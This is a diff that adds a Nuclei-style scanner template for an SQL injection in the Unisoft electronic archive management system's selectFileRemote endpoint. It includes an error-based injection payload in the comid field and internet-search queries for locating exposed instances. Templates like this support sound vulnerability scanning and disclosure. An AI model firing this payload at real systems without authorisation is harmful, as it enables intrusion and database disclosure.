@@ -1,0 +1,35 @@
+id: Thams_selectFileRemote_SQLi
+
+info:
+  name: Thams_selectFileRemote_SQLi
+  author: HK
+  severity: high
+  description: 紫光电子档案管理系统selectFileRemote存在SQL注入漏洞
+  metadata:
+    max-request: 1
+    Fofa-query: body="www.unissoft.com"
+    Quake-query: body="www.unissoft.com"
+    Hunter-query: body="www.unissoft.com"
+    verified: true
+
+http:
+- raw:
+  - |-
+    @timeout: 30s
+    POST /Archive/ErecordManage/selectFileRemote HTTP/1.1
+    Host: {{Hostname}}
+    Accept: */* Accept-Encoding: gzip, deflate
+    Connection: close
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 76
+
+    userID=admin&fondsid=1&comid=' and updatexml(1,concat(0x7e,user(),0x7e),1)=1
+
+  max-redirects: 3
+  matchers-condition: and
+  matchers:
+    - type: word
+      part: body
+      words:
+        - XPATH
